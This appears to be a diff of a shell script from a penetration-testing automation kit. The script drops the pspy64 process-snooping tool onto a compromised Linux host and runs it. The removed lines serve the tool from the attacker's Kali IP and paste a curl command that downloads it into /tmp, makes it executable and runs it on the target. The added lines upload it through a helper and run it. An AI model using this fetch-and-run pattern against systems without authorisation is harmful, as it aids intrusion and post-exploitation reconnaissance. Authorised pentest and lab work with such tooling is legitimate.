@@ -4,15 +4,11 @@
 download pspy64 to server and run it
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+LOCATION="${SCRIPTS_DIR}/reconnaissance/linux/.files"
+FILE="pspy64"
 
-cd /opt/linux
-python3 -m http.server 1337 &
-HTTP_PID=$!
+curl_upload_file "${LOCATION}" "${FILE}"
+sleep 3
 
-paste_command "curl http://${KALI_IP}:1337/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && cd /tmp && ls -alF /tmp && /tmp/pspy64 -pf -i 1000"
+paste_command "${FILE_LOCATION} -pf -i 1000"
 xdotool key Return
-sleep 10
-
-kill $HTTP_PID
